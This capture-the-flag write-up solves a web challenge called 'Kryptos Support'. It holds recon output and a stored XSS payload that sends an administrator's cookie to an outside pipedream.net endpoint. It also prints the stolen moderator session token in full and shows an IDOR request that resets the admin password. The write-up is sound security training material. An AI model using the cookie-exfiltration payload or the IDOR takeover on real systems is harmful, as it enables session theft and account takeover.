# Kryptos Support

> The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?

---

## Web Application Enumeration

Appears to be a Node.js web application, built with the Express framework.

```bash
$ nmap -Pn -sV -p32131 165.227.224.55
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 18:27 EDT
Nmap scan report for 165.227.224.55
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
32131/tcp open  http    Node.js (Express middleware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
```

### Site Map

- [ ] `/`: Form for submitting issues regarding the Kryptos vault
- [ ] `/login`: Login page (username and password)


### Content Discovery

Several paths, except for `/login`, redirect to `/`. `/static` 404s.

```bash
$ feroxbuster -u http://165.227.224.55:32131 --no-recursion

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://165.227.224.55:32131
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        1l        4w       23c http://165.227.224.55:32131/logout => /
200      GET       53l      114w     2352c http://165.227.224.55:32131/login
302      GET        1l        4w       23c http://165.227.224.55:32131/admin => /
302      GET        1l        4w       23c http://165.227.224.55:32131/Admin => /
301      GET       10l       16w      179c http://165.227.224.55:32131/static => /static/
200      GET       53l      114w     2352c http://165.227.224.55:32131/Login
302      GET        1l        4w       23c http://165.227.224.55:32131/ADMIN => /
302      GET        1l        4w       23c http://165.227.224.55:32131/settings => /
302      GET        1l        4w       23c http://165.227.224.55:32131/tickets => /
302      GET        1l        4w       23c http://165.227.224.55:32131/Settings => /
301      GET       10l       16w      179c http://165.227.224.55:32131/Static => /Static/
302      GET        1l        4w       23c http://165.227.224.55:32131/Logout => /
200      GET       53l      114w     2352c http://165.227.224.55:32131/LOGIN
302      GET        1l        4w       23c http://165.227.224.55:32131/Tickets => /
301      GET       10l       16w      179c http://165.227.224.55:32131/STATIC => /STATIC/
[####################] - 1m     29999/29999   0s      found:15      errors:0
[####################] - 1m     29999/29999   432/s   http://165.227.224.55:32131
```

### Kryptos Vault Issue Form

Submitting the form results in an HTTP `POST` request to `/api/tickets/add`.

```http
POST /api/tickets/add HTTP/1.1
Host: 165.227.224.55:32131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://165.227.224.55:32131/
Content-Type: application/json
Origin: http://165.227.224.55:32131
Content-Length: 18
Connection: close

{"message":"blah"}
```

The response indicates the submission will be reviewed by an administrator shortly.

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 55
ETag: W/"37-xX0taFpln/xC3zxt223Qgw6N4F8"
Date: Sun, 15 May 2022 22:29:33 GMT
Connection: close

{"message":"An admin will review your ticket shortly!"}
```

This seems like a ripe XSS opportunity. The following payload sends the administrator's cookie to a [Pipedream]() instance owned by the attacker.

```http
POST /api/tickets/add HTTP/1.1
Host: 165.227.224.55:32131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://165.227.224.55:32131/
Content-Type: application/json
Origin: http://165.227.224.55:32131
Content-Length: 104
Connection: close

{"message":"<img src=x onerror=this.src='https://en54jwrybvpd4za.m.pipedream.net?q='+document.cookie;>"}
```

The resultant cookie is a JWT: `session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NTQxOTN9.U9I8eLSVmrPRjp_ptYTd6_ABK0jlBJLok-XNf3Xb-OU`.

Its payload indicates it is for the `moderator` user, with user ID `100`.

```json
{
  "username": "moderator",
  "uid": 100,
  "iat": 1652654193
}
```

Setting this cookie grants access to `/admin` and `/settings` as `moderator`. `/settings` makes it possible to change the current user's password, generating the following HTTP request:

```http
POST /api/users/update HTTP/1.1
Host: 138.68.188.223:32729
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.188.223:32729/settings
Content-Type: application/json
Origin: http://138.68.188.223:32729
Content-Length: 30
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NjEwMTh9.Umnn_EvgeD3un7HuWYXmJyGgVDKhpm4sDLvIziYRklU

{"password":"blah","uid":"100"}
```

A bit of probing indicates this endpoint is vulnerable to an Insecure Directory Object Reference (IDOR) vulnerability, making it possible to change another user's password by modifying the `uid` parameter to that user's ID. Some trial and error shows that the user ID 1 belongs to `admin`. Change `admin`'s password.

```http
POST /api/users/update HTTP/1.1
Host: 138.68.188.223:32729
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.188.223:32729/settings
Content-Type: application/json
Origin: http://138.68.188.223:32729
Content-Length: 30
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NjEwMTh9.Umnn_EvgeD3un7HuWYXmJyGgVDKhpm4sDLvIziYRklU

{"password":"blah","uid":"1"}
```

Login with the credential `admin`:`blah` and grab the flag.
